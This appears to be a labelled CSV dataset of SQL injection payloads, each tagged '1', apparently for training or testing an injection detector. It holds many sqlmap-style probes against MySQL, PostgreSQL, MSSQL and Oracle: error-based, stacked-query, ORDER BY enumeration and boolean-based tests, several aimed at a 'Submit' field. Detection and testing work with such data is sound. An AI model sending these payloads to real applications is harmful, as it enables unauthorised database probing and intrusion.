"1' PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND 'fdhU' LIKE 'fdhU",1
"1"") PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND (""sBTD""=""sBTD",1
"1"" PROCEDURE ANALYSE(EXTRACTVALUE(9424,CONCAT(0x5c,0x71766b6271,(SELECT (CASE WHEN (9424=9424) THEN 1 ELSE 0 END)),0x717a627671)),1) AND ""BWHX""=""BWHX",1
"(EXTRACTVALUE(9902,CONCAT(0x5c,0x71766b6271,(SELECT (ELT(9902=9902,1))),0x717a627671)))",1
(CAST((CHR(113)||CHR(118)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (5412=5412) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(122)||CHR(98)||CHR(118)||CHR(113)) AS NUMERIC)),1
1);DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1));DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1;DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1');DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1'));DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1';DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
1%';DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--,1
"1"");DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--",1
"1"";DECLARE @nnQB NVARCHAR(4000);SET @nnQB=(SELECT 'qvkbq'+(SELECT (CASE WHEN (7528=7528) THEN '1' ELSE '0' END))+'qzbvq');EXEC @nnQB--",1
1) ORDER BY 1-- Mpgl,1
1) ORDER BY 5347-- xtrv,1
1)) ORDER BY 1-- dnsg,1
1)) ORDER BY 5868-- YHZq,1
1 ORDER BY 1-- WFxH,1
1 ORDER BY 1481-- sKgc,1
1 ORDER BY 1-- UlkC,1
1 ORDER BY 2629-- pthv,1
1') ORDER BY 1-- HLJP,1
1') ORDER BY 9820-- sTio,1
1')) ORDER BY 1-- ssMU,1
1')) ORDER BY 2906-- Inuq,1
1' ORDER BY 1-- DvZU,1
1' ORDER BY 6707-- zVFG,1
1') ORDER BY 1-- yOqq,1
1') ORDER BY 8055-- EJIf,1
1%' ORDER BY 1-- eQwk,1
1%' ORDER BY 6886-- hFeQ,1
1' ORDER BY 1-- VDQa,1
1' ORDER BY 7861-- kmBs,1
"1"") ORDER BY 1-- jjAo",1
"1"") ORDER BY 7087-- Fqjh",1
"1"" ORDER BY 1-- HwlI",1
"1"" ORDER BY 1814-- mLpe",1
1) ORDER BY 1#,1
1) ORDER BY 7712#,1
1)) ORDER BY 1#,1
1)) ORDER BY 1335#,1
1 ORDER BY 1#,1
1 ORDER BY 5822#,1
1 ORDER BY 1#,1
1 ORDER BY 5510#,1
1') ORDER BY 1#,1
1') ORDER BY 6154#,1
1')) ORDER BY 1#,1
1')) ORDER BY 9694#,1
1' ORDER BY 1#,1
1' ORDER BY 9215#,1
1') ORDER BY 1#,1
1') ORDER BY 5085#,1
1%' ORDER BY 1#,1
1%' ORDER BY 5098#,1
1' ORDER BY 1#,1
1' ORDER BY 6370#,1
"1"") ORDER BY 1#",1
"1"") ORDER BY 5809#",1
"1"" ORDER BY 1#",1
"1"" ORDER BY 1269#",1
"Submit..,(',((,""",1
"Submit'HVVxwq<'"">OnggPp",1
Submit') AND 4561=9003 AND ('zoSf'='zoSf,1
Submit') AND 8895=8895 AND ('viXG'='viXG,1
Submit') AND 5950=8820 AND ('TIrc'='TIrc,1
Submit')) AND 3893=9506 AND (('EMIW'='EMIW,1
Submit')) AND 8895=8895 AND (('aTNs'='aTNs,1
Submit')) AND 6413=1839 AND (('UvxM'='UvxM,1
Submit' AND 3349=7582 AND 'vEMs'='vEMs,1
Submit' AND 8895=8895 AND 'DAFQ'='DAFQ,1
Submit' AND 8408=7666 AND 'pzWf'='pzWf,1
Submit') AND 1902=8619 AND ('MUIG' LIKE 'MUIG,1
Submit') AND 8895=8895 AND ('lnJF' LIKE 'lnJF,1
Submit') AND 9643=5981 AND ('AmFo' LIKE 'AmFo,1
Submit%' AND 2959=2342 AND 'EvKm%'='EvKm,1
Submit%' AND 8895=8895 AND 'ZFCu%'='ZFCu,1
Submit%' AND 8555=5385 AND 'rfNg%'='rfNg,1
Submit' AND 2212=8476 AND 'CNJp' LIKE 'CNJp,1
Submit' AND 8895=8895 AND 'rhOh' LIKE 'rhOh,1
Submit' AND 3879=4697 AND 'tEqD' LIKE 'tEqD,1
"Submit"") AND 6049=1030 AND (""VtIZ""=""VtIZ",1
"Submit"") AND 8895=8895 AND (""rqqv""=""rqqv",1
"Submit"") AND 1651=7443 AND (""bGLI""=""bGLI",1
"Submit"" AND 9691=3295 AND ""EVNU""=""EVNU",1
"Submit"" AND 8895=8895 AND ""fGUD""=""fGUD",1
"Submit"" AND 9269=5560 AND ""lZAh""=""lZAh",1
Submit) AND 6958=2805 AND (3278=3278,1
Submit) AND 8895=8895 AND (4063=4063,1
Submit) AND 8870=9969 AND (2800=2800,1
Submit)) AND 3108=6855 AND ((5637=5637,1
Submit)) AND 8895=8895 AND ((8319=8319,1
Submit)) AND 5113=2866 AND ((7624=7624,1
Submit AND 4831=5603,1
Submit AND 8895=8895,1
Submit AND 6609=3251,1
Submit AND 3392=5562-- eqLo,1
Submit AND 8895=8895-- tVSS,1
Submit AND 6333=9305-- EEvz,1
Submit') AND 6015=(SELECT (CASE WHEN (6015=3665) THEN 6015 ELSE (SELECT 3665 UNION SELECT 7178) END))-- XTCj,1
Submit') AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- epAZ,1
Submit') AND 2348=(SELECT (CASE WHEN (2348=6198) THEN 2348 ELSE (SELECT 6198 UNION SELECT 8979) END))-- WzRW,1
Submit')) AND 5112=(SELECT (CASE WHEN (5112=5914) THEN 5112 ELSE (SELECT 5914 UNION SELECT 7255) END))-- kvEm,1
Submit')) AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- BEsu,1
Submit')) AND 4686=(SELECT (CASE WHEN (4686=6531) THEN 4686 ELSE (SELECT 6531 UNION SELECT 8693) END))-- IQgq,1
Submit' AND 6273=(SELECT (CASE WHEN (6273=9422) THEN 6273 ELSE (SELECT 9422 UNION SELECT 7661) END))-- Qohd,1
Submit' AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- mJbm,1
Submit' AND 8611=(SELECT (CASE WHEN (8611=7270) THEN 8611 ELSE (SELECT 7270 UNION SELECT 3899) END))-- sTRS,1
Submit%' AND 8880=(SELECT (CASE WHEN (8880=6730) THEN 8880 ELSE (SELECT 6730 UNION SELECT 4773) END))-- ogXV,1
Submit%' AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- kxyf,1
Submit%' AND 3213=(SELECT (CASE WHEN (3213=5616) THEN 3213 ELSE (SELECT 5616 UNION SELECT 3095) END))-- ANYX,1
"Submit"") AND 8204=(SELECT (CASE WHEN (8204=2215) THEN 8204 ELSE (SELECT 2215 UNION SELECT 8481) END))-- ZVGh",1
"Submit"") AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- DeRl",1
"Submit"") AND 1878=(SELECT (CASE WHEN (1878=6371) THEN 1878 ELSE (SELECT 6371 UNION SELECT 7335) END))-- XEWS",1
"Submit"" AND 5218=(SELECT (CASE WHEN (5218=2348) THEN 5218 ELSE (SELECT 2348 UNION SELECT 6279) END))-- bxCa",1
"Submit"" AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- onso",1
"Submit"" AND 2811=(SELECT (CASE WHEN (2811=4934) THEN 2811 ELSE (SELECT 4934 UNION SELECT 9233) END))-- EftY",1
Submit) AND 9872=(SELECT (CASE WHEN (9872=2701) THEN 9872 ELSE (SELECT 2701 UNION SELECT 4588) END))-- VVGF,1
Submit) AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- ECWF,1
Submit) AND 5816=(SELECT (CASE WHEN (5816=3194) THEN 5816 ELSE (SELECT 3194 UNION SELECT 1190) END))-- mHNL,1
Submit)) AND 1808=(SELECT (CASE WHEN (1808=3760) THEN 1808 ELSE (SELECT 3760 UNION SELECT 3309) END))-- wMxG,1
Submit)) AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- hDIl,1
Submit)) AND 9116=(SELECT (CASE WHEN (9116=3172) THEN 9116 ELSE (SELECT 3172 UNION SELECT 6123) END))-- LVin,1
Submit AND 1485=(SELECT (CASE WHEN (1485=7689) THEN 1485 ELSE (SELECT 7689 UNION SELECT 2945) END))-- ZuSH,1
Submit AND 3232=(SELECT (CASE WHEN (3232=3232) THEN 3232 ELSE (SELECT 7968 UNION SELECT 9968) END))-- BthC,1
Submit AND 8051=(SELECT (CASE WHEN (8051=6573) THEN 8051 ELSE (SELECT 6573 UNION SELECT 3905) END))-- fgvn,1
Submit') AND 3082=6295-- jQRg,1
Submit') AND 1493=1493-- Pjur,1
Submit') AND 3299=4753-- DpbE,1
Submit')) AND 3818=5362-- JLKB,1
Submit')) AND 1493=1493-- CpKk,1
Submit')) AND 8312=1735-- MgdD,1
Submit' AND 9499=8495-- iexl,1
Submit' AND 1493=1493-- wAfk,1
Submit' AND 9912=5770-- rqkw,1
Submit%' AND 4150=2262-- nXRV,1
Submit%' AND 1493=1493-- ctSS,1
Submit%' AND 7427=9868-- rJjl,1
"Submit"") AND 9080=1553-- tDyI",1
"Submit"") AND 1493=1493-- pXcq",1
"Submit"") AND 2014=2088-- hPJL",1
"Submit"" AND 6956=1919-- bZZq",1
"Submit"" AND 1493=1493-- hpHd",1
"Submit"" AND 3542=8206-- RlwW",1
Submit) AND 7617=3158-- DSqW,1
Submit) AND 1493=1493-- uTUQ,1
Submit) AND 1807=8590-- dniP,1
Submit)) AND 1871=9759-- RuWu,1
Submit)) AND 1493=1493-- Hjqs,1
Submit)) AND 1987=8213-- xkQL,1
Submit') RLIKE (SELECT (CASE WHEN (7621=9476) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('fZXO'='fZXO,1
Submit') RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('egAk'='egAk,1
Submit') RLIKE (SELECT (CASE WHEN (6622=6223) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('uPIl'='uPIl,1
Submit')) RLIKE (SELECT (CASE WHEN (8811=2026) THEN 0x5375626d6974 ELSE 0x28 END)) AND (('sHdZ'='sHdZ,1
Submit')) RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND (('IKTS'='IKTS,1
Submit')) RLIKE (SELECT (CASE WHEN (2905=6268) THEN 0x5375626d6974 ELSE 0x28 END)) AND (('ddot'='ddot,1
Submit' RLIKE (SELECT (CASE WHEN (1676=4273) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'INQD'='INQD,1
Submit' RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'pKIC'='pKIC,1
Submit' RLIKE (SELECT (CASE WHEN (3093=8730) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'nTpa'='nTpa,1
Submit') RLIKE (SELECT (CASE WHEN (1693=8278) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('BDrL' LIKE 'BDrL,1
Submit') RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('zHAQ' LIKE 'zHAQ,1
Submit') RLIKE (SELECT (CASE WHEN (4885=1694) THEN 0x5375626d6974 ELSE 0x28 END)) AND ('kzRw' LIKE 'kzRw,1
Submit%' RLIKE (SELECT (CASE WHEN (2262=5283) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'OEUf%'='OEUf,1
Submit%' RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'OarL%'='OarL,1
Submit%' RLIKE (SELECT (CASE WHEN (9802=9693) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'rWjF%'='rWjF,1
Submit' RLIKE (SELECT (CASE WHEN (5895=1050) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'vrGJ' LIKE 'vrGJ,1
Submit' RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'Zkpi' LIKE 'Zkpi,1
Submit' RLIKE (SELECT (CASE WHEN (4021=2876) THEN 0x5375626d6974 ELSE 0x28 END)) AND 'Phkj' LIKE 'Phkj,1
"Submit"") RLIKE (SELECT (CASE WHEN (7349=9929) THEN 0x5375626d6974 ELSE 0x28 END)) AND (""wkUH""=""wkUH",1
"Submit"") RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND (""Vboy""=""Vboy",1
"Submit"") RLIKE (SELECT (CASE WHEN (2917=8592) THEN 0x5375626d6974 ELSE 0x28 END)) AND (""zIwJ""=""zIwJ",1
"Submit"" RLIKE (SELECT (CASE WHEN (3683=3887) THEN 0x5375626d6974 ELSE 0x28 END)) AND ""RNcS""=""RNcS",1
"Submit"" RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND ""gkaL""=""gkaL",1
"Submit"" RLIKE (SELECT (CASE WHEN (5288=6525) THEN 0x5375626d6974 ELSE 0x28 END)) AND ""XICV""=""XICV",1
Submit) RLIKE (SELECT (CASE WHEN (7783=6188) THEN 0x5375626d6974 ELSE 0x28 END)) AND (2665=2665,1
Submit) RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND (2219=2219,1
Submit) RLIKE (SELECT (CASE WHEN (2063=9769) THEN 0x5375626d6974 ELSE 0x28 END)) AND (2711=2711,1
Submit)) RLIKE (SELECT (CASE WHEN (2145=3537) THEN 0x5375626d6974 ELSE 0x28 END)) AND ((1123=1123,1
Submit)) RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)) AND ((1064=1064,1
Submit)) RLIKE (SELECT (CASE WHEN (7081=5218) THEN 0x5375626d6974 ELSE 0x28 END)) AND ((1183=1183,1
Submit RLIKE (SELECT (CASE WHEN (5058=3534) THEN 0x5375626d6974 ELSE 0x28 END)),1
Submit RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END)),1
Submit RLIKE (SELECT (CASE WHEN (3387=2899) THEN 0x5375626d6974 ELSE 0x28 END)),1
Submit RLIKE (SELECT (CASE WHEN (1526=3415) THEN 0x5375626d6974 ELSE 0x28 END))-- bhgz,1
Submit RLIKE (SELECT (CASE WHEN (7694=7694) THEN 0x5375626d6974 ELSE 0x28 END))-- CbNK,1
Submit RLIKE (SELECT (CASE WHEN (7815=9928) THEN 0x5375626d6974 ELSE 0x28 END))-- uRNn,1
Submit') AND (SELECT (CASE WHEN (1967=7958) THEN NULL ELSE CAST((CHR(85)||CHR(103)||CHR(85)||CHR(87)) AS NUMERIC) END)) IS NULL AND ('aQPJ'='aQPJ,1
Submit') AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND ('QkbJ'='QkbJ,1
Submit') AND (SELECT (CASE WHEN (9063=7665) THEN NULL ELSE CAST((CHR(115)||CHR(98)||CHR(122)||CHR(114)) AS NUMERIC) END)) IS NULL AND ('uRzA'='uRzA,1
Submit')) AND (SELECT (CASE WHEN (6543=2098) THEN NULL ELSE CAST((CHR(87)||CHR(90)||CHR(75)||CHR(66)) AS NUMERIC) END)) IS NULL AND (('puRU'='puRU,1
Submit')) AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND (('UqjQ'='UqjQ,1
Submit')) AND (SELECT (CASE WHEN (4056=5147) THEN NULL ELSE CAST((CHR(76)||CHR(75)||CHR(121)||CHR(81)) AS NUMERIC) END)) IS NULL AND (('qFrW'='qFrW,1
Submit' AND (SELECT (CASE WHEN (6594=1557) THEN NULL ELSE CAST((CHR(85)||CHR(79)||CHR(76)||CHR(103)) AS NUMERIC) END)) IS NULL AND 'bmfh'='bmfh,1
Submit' AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND 'qrWV'='qrWV,1
Submit' AND (SELECT (CASE WHEN (1186=4615) THEN NULL ELSE CAST((CHR(98)||CHR(67)||CHR(108)||CHR(111)) AS NUMERIC) END)) IS NULL AND 'xAoX'='xAoX,1
Submit') AND (SELECT (CASE WHEN (8588=4740) THEN NULL ELSE CAST((CHR(74)||CHR(106)||CHR(113)||CHR(100)) AS NUMERIC) END)) IS NULL AND ('qkhS' LIKE 'qkhS,1
Submit') AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND ('sGMg' LIKE 'sGMg,1
Submit') AND (SELECT (CASE WHEN (5556=1304) THEN NULL ELSE CAST((CHR(113)||CHR(122)||CHR(74)||CHR(112)) AS NUMERIC) END)) IS NULL AND ('GrKm' LIKE 'GrKm,1
Submit%' AND (SELECT (CASE WHEN (2978=6901) THEN NULL ELSE CAST((CHR(105)||CHR(108)||CHR(106)||CHR(84)) AS NUMERIC) END)) IS NULL AND 'DDlM%'='DDlM,1
Submit%' AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND 'eaNc%'='eaNc,1
Submit%' AND (SELECT (CASE WHEN (7709=7600) THEN NULL ELSE CAST((CHR(109)||CHR(104)||CHR(111)||CHR(119)) AS NUMERIC) END)) IS NULL AND 'QhpM%'='QhpM,1
Submit' AND (SELECT (CASE WHEN (6666=3111) THEN NULL ELSE CAST((CHR(66)||CHR(87)||CHR(79)||CHR(80)) AS NUMERIC) END)) IS NULL AND 'albB' LIKE 'albB,1
Submit' AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND 'mZMz' LIKE 'mZMz,1
Submit' AND (SELECT (CASE WHEN (4630=6815) THEN NULL ELSE CAST((CHR(72)||CHR(84)||CHR(76)||CHR(74)) AS NUMERIC) END)) IS NULL AND 'KazW' LIKE 'KazW,1
"Submit"") AND (SELECT (CASE WHEN (2930=1987) THEN NULL ELSE CAST((CHR(119)||CHR(81)||CHR(112)||CHR(102)) AS NUMERIC) END)) IS NULL AND (""wahq""=""wahq",1
"Submit"") AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND (""ReSL""=""ReSL",1
"Submit"") AND (SELECT (CASE WHEN (9798=1594) THEN NULL ELSE CAST((CHR(87)||CHR(119)||CHR(79)||CHR(77)) AS NUMERIC) END)) IS NULL AND (""MnqS""=""MnqS",1
"Submit"" AND (SELECT (CASE WHEN (3054=4113) THEN NULL ELSE CAST((CHR(102)||CHR(117)||CHR(117)||CHR(100)) AS NUMERIC) END)) IS NULL AND ""YTFW""=""YTFW",1
"Submit"" AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND ""vQlB""=""vQlB",1
"Submit"" AND (SELECT (CASE WHEN (5818=3062) THEN NULL ELSE CAST((CHR(110)||CHR(115)||CHR(65)||CHR(98)) AS NUMERIC) END)) IS NULL AND ""hemg""=""hemg",1
Submit) AND (SELECT (CASE WHEN (4001=9701) THEN NULL ELSE CAST((CHR(108)||CHR(76)||CHR(116)||CHR(83)) AS NUMERIC) END)) IS NULL AND (9644=9644,1
Submit) AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND (4303=4303,1
Submit) AND (SELECT (CASE WHEN (4204=4362) THEN NULL ELSE CAST((CHR(102)||CHR(78)||CHR(74)||CHR(97)) AS NUMERIC) END)) IS NULL AND (3774=3774,1
Submit)) AND (SELECT (CASE WHEN (2288=8819) THEN NULL ELSE CAST((CHR(107)||CHR(122)||CHR(106)||CHR(68)) AS NUMERIC) END)) IS NULL AND ((8897=8897,1
Submit)) AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL AND ((6496=6496,1
Submit)) AND (SELECT (CASE WHEN (4478=9220) THEN NULL ELSE CAST((CHR(107)||CHR(81)||CHR(71)||CHR(72)) AS NUMERIC) END)) IS NULL AND ((1337=1337,1
Submit AND (SELECT (CASE WHEN (2229=5726) THEN NULL ELSE CAST((CHR(88)||CHR(71)||CHR(115)||CHR(113)) AS NUMERIC) END)) IS NULL,1
Submit AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL,1
Submit AND (SELECT (CASE WHEN (7009=5608) THEN NULL ELSE CAST((CHR(68)||CHR(118)||CHR(121)||CHR(89)) AS NUMERIC) END)) IS NULL,1
Submit AND (SELECT (CASE WHEN (3892=6927) THEN NULL ELSE CAST((CHR(112)||CHR(120)||CHR(99)||CHR(120)) AS NUMERIC) END)) IS NULL-- YPGY,1
Submit AND (SELECT (CASE WHEN (8540=8540) THEN NULL ELSE CAST((CHR(77)||CHR(116)||CHR(120)||CHR(72)) AS NUMERIC) END)) IS NULL-- tsUE,1
Submit AND (SELECT (CASE WHEN (2784=3844) THEN NULL ELSE CAST((CHR(66)||CHR(76)||CHR(68)||CHR(69)) AS NUMERIC) END)) IS NULL-- PQGT,1
"Submit') AND (SELECT (CASE WHEN (5912=4521) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5912) END) FROM DUAL) IS NULL AND ('pcDa'='pcDa",1
"Submit') AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND ('DsCi'='DsCi",1
"Submit') AND (SELECT (CASE WHEN (3804=6836) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3804) END) FROM DUAL) IS NULL AND ('IuOy'='IuOy",1
"Submit')) AND (SELECT (CASE WHEN (9878=8597) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9878) END) FROM DUAL) IS NULL AND (('skbJ'='skbJ",1
"Submit')) AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND (('wZHQ'='wZHQ",1
"Submit')) AND (SELECT (CASE WHEN (5848=5594) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5848) END) FROM DUAL) IS NULL AND (('FyYm'='FyYm",1
"Submit' AND (SELECT (CASE WHEN (2472=4248) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2472) END) FROM DUAL) IS NULL AND 'LnpA'='LnpA",1
"Submit' AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND 'VzNS'='VzNS",1
"Submit' AND (SELECT (CASE WHEN (2141=4398) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2141) END) FROM DUAL) IS NULL AND 'gUOE'='gUOE",1
"Submit') AND (SELECT (CASE WHEN (7003=2032) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7003) END) FROM DUAL) IS NULL AND ('wgbj' LIKE 'wgbj",1
"Submit') AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND ('ScKZ' LIKE 'ScKZ",1
"Submit') AND (SELECT (CASE WHEN (9694=5748) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9694) END) FROM DUAL) IS NULL AND ('JbHD' LIKE 'JbHD",1
"Submit%' AND (SELECT (CASE WHEN (2234=2966) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2234) END) FROM DUAL) IS NULL AND 'tSiu%'='tSiu",1
"Submit%' AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND 'ZzgJ%'='ZzgJ",1
"Submit%' AND (SELECT (CASE WHEN (2984=4069) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2984) END) FROM DUAL) IS NULL AND 'dKXo%'='dKXo",1
"Submit' AND (SELECT (CASE WHEN (6116=2573) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6116) END) FROM DUAL) IS NULL AND 'cuQe' LIKE 'cuQe",1
"Submit' AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND 'mSDN' LIKE 'mSDN",1
"Submit' AND (SELECT (CASE WHEN (2157=2052) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2157) END) FROM DUAL) IS NULL AND 'TJWd' LIKE 'TJWd",1
"Submit"") AND (SELECT (CASE WHEN (6250=6334) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6250) END) FROM DUAL) IS NULL AND (""rNWS""=""rNWS",1
"Submit"") AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND (""wgtO""=""wgtO",1
"Submit"") AND (SELECT (CASE WHEN (2158=9961) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,2158) END) FROM DUAL) IS NULL AND (""MNzJ""=""MNzJ",1
"Submit"" AND (SELECT (CASE WHEN (7671=5894) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,7671) END) FROM DUAL) IS NULL AND ""Owid""=""Owid",1
"Submit"" AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND ""RRHb""=""RRHb",1
"Submit"" AND (SELECT (CASE WHEN (8936=9640) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8936) END) FROM DUAL) IS NULL AND ""DYLH""=""DYLH",1
"Submit) AND (SELECT (CASE WHEN (8130=2858) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8130) END) FROM DUAL) IS NULL AND (1307=1307",1
"Submit) AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND (7710=7710",1
"Submit) AND (SELECT (CASE WHEN (6247=7283) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,6247) END) FROM DUAL) IS NULL AND (5336=5336",1
"Submit)) AND (SELECT (CASE WHEN (9284=6213) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9284) END) FROM DUAL) IS NULL AND ((5684=5684",1
"Submit)) AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL AND ((9657=9657",1
"Submit)) AND (SELECT (CASE WHEN (9019=3459) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,9019) END) FROM DUAL) IS NULL AND ((5256=5256",1
"Submit AND (SELECT (CASE WHEN (3159=5041) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,3159) END) FROM DUAL) IS NULL",1
"Submit AND (SELECT (CASE WHEN (8743=8743) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,8743) END) FROM DUAL) IS NULL",1
"Submit AND (SELECT (CASE WHEN (5854=5447) THEN NULL ELSE CTXSYS.DRITHSX.SN(1,5854) END) FROM DUAL) IS NULL",1
